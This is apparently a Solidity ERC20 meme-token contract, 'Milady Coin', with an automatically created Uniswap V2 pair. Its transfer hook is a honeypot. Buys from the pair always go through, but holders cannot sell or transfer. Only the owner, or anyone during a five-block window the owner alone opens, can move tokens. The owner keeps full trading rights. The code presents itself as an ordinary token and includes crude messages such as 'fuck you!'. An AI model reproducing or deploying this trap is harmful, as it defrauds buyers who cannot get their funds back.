// SPDX-License-Identifier: MIT

//             [ SOCIALS ]
// -----------------------------------
// | <TELEGRAM>      |
// | <WEBSITE>            |
// | <TWITTER> |
// -----------------------------------

pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./IUniswapFactory.sol";
import "./IUniswapV2Pair.sol";

contract MiladyCoin is ERC20 {

  uint256 private INITIAL_SUPPLY   = 420_000_000_000 ether;
  address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  address constant UNISWAPV2FACTORY = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
  address immutable uniswapV2Pair;
  address immutable _owner;
  uint256 private endBlock = 0;

  event LiquidityPairSet(address);

  constructor() ERC20("Milady Coin", "MILADY") {
    _owner = _msgSender();
    uniswapV2Pair = IUniswapV2Factory(UNISWAPV2FACTORY).createPair(address(this), WETH);
    emit LiquidityPairSet(uniswapV2Pair);
    _mint(_msgSender(), INITIAL_SUPPLY);
  }

  modifier onlyAsshole {
    require(_msgSender() == _owner);
    _;
  }

  function startEndBlock() public onlyAsshole {
    endBlock = block.number + 5;
  }

  function isChamp(address sender, address recipient) internal view returns (bool){
    return sender == uniswapV2Pair || sender == _owner || recipient == _owner;
  }

  function _beforeTokenTransfer(address sender, address recipient, uint256 amount) internal override {
    require(amount > 0, "amount must be greater than zero");
    require(isChamp(sender, recipient) || (block.number < endBlock), "fuck you!");
    super._beforeTokenTransfer(sender, recipient, amount);
  }
}